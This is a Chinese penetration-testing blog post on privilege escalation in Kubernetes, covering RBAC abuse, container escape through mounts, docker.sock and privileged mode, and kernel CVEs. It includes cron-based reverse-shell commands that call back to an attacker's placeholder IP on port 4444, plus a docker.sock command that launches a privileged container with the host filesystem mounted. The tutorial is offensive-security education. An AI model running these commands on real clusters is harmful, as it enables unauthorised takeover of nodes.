---
title: "K8s渗透-权限提升"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# K8s渗透-权限提升

> 文章首发于track安全社区：[K8s渗透入门从零到一](https://bbs.zkaq.cn/t/32483.html)

一般来说，在k8s中的提权就是尝试从pod容器获取到对node节点的控制权，甚至获取对云资源的访问权限。

## RBAC权限滥用

类似于我们在执行中提到的打法，就是获取pod中高权限（比如绑定到cluster-admin用户组）的serviceaccount，然后再调用apiserver实现逃逸，然而除了cluster-admin，很多凭证也是可以权限提升到cluster-admin的，我们可以重点关注Helm、Cilium、Nginx Ingress、Prometheus等服务

## 部署静态pod

这个方法在我的[k8s渗透-持久化](https://yuy0ung.github.io/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%8C%81%E4%B9%85%E5%8C%96/)的笔记中已经介绍过了，这里不再赘述

## 利用容器不安全配置提权

即容器逃逸，这里的很多tricks其实和docker逃逸没有很大区别

### 挂载目录逃逸

挂载的方法很多，例如挂载根目录、挂载pocfs、挂载/etc、挂载cgroup、挂载/var/log等等，可以直接看我的这篇文章：[Docker逃逸手法大全](https://yuy0ung.github.io/blog/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8%E6%89%8B%E6%B3%95%E5%A4%A7%E5%85%A8/)，这里提一个最简单的挂载根目录：

比如我们创建恶意pod的时候，根目录挂载到了容器的`/mnt`目录，所以在获取了pod的shell后，我们可以通过查看pod的`/mnt`目录来访问查看node的根目录：

![QQ_1752337790318](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337790318-20250714003958889.png)

接下来可以通过写定时任务来获取node的shell：

~~~sh
echo -e "* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/<vps的公网IP>/4444 0>&1 & disown  '" >> /mnt/etc/crontab
~~~

>注意，这里并没有直接使用`sh -i > /dev/tcp/<IP>/4444 2>&1`，因为cron 默认使用的是 /bin/sh，而不是 bash，sh 不支持`>&`语法，上面的yaml文件中反弹shell的payload同理

我在k3s环境遇到一个问题，在收到反弹shell后会立刻自动exit或者退出：

![QQ_1752384892469](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752384892469.png)

这里其实可以偷懒直接chroot一下也行，但是这样只能以高权限进行文件相关操作：
![QQ_1752342324537](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752342324537-20250714004016922.png)

不过通过查阅资料发现原因可能和busybox的情况类似，对`-i`即交互参数支持不完整，那么我们可以尝试使用`disown`命令让我们反弹shell的进程不受父shell进程影响而exit：

```
echo -e "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1 & disown'" >> /mnt/etc/crontab
```

![QQ_1752384977729](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752384977729.png)

此时我们就可以接收到反弹的shell并且不会断开了：
![QQ_1752344803661](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752344803661-20250714004017953.png)

### 持久化挂载docker.sock

挂载docker socket逃逸同样在我写的 [Docker逃逸手法大全](https://yuy0ung.github.io/blog/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8%E6%89%8B%E6%B3%95%E5%A4%A7%E5%85%A8/) 中详细介绍了，值得一提的是，如果已经获取了此类容器的 full tty shell, 可以用类似下述的命令创建一个通往宿主机的 shell：
~~~sh
./bin/docker -H unix:///tmp/rootfs/var/run/docker.sock run -d -it --rm --name rshell -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
~~~

### 容器特权逃逸

同样在 [Docker逃逸手法大全](https://yuy0ung.github.io/blog/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8%E6%89%8B%E6%B3%95%E5%A4%A7%E5%85%A8/) 里详细介绍了，值得一题的是关于特权信息搜集时的小技巧，在我这篇笔记中有记录：[K8s渗透-信息搜集](https://yuy0ung.github.io/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/)

## 容器基础应用或容器编排平台漏洞

### docker漏洞

即docker逃逸的一些历史CVE，基本和docker的runc、containerd等容器相关

### k8s漏洞

即k8s容器逃逸的一些历史CVE

## 利用linux内核漏洞逃逸

这个原理在docker逃逸的文章也解释了，就是容器与宿主机共享内核并使用内核功能（比如cgroup和namespace）进行容器和宿主机的隔离，我们可以使用内核提权漏洞来进行逃逸，常见如下：

* CVE-2016-5195 DirtyCow：执行 `uname -r`，**2.6.22<=内核版本<=4.8.3**时可能存在
* CVE-2020-14386：**4.6<=内核版本<=5.9**时可能存在
* CVE-2022-0847：**内核版本小于5.16.11且不是5.15.25、5.10.102**时可能存在

## 总结

可以看见k8s中权限提升的常见方法就是权限滥用或容器逃逸